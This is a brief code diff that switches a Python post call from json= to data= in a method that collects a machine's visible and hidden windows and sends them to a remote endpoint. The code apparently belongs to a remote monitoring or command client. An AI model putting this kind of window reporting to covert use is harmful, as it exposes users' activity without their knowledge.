@@ -19,7 +19,7 @@ class Executor:
 
     def send_open_windows(self):
         visible, hidden = WindowCatcher().collect()
-        secure_requests.post(self.endpoint, json={
+        secure_requests.post(self.endpoint, data={
             'action': 'send_open_windows',
             'data': {
                 'visible': visible,
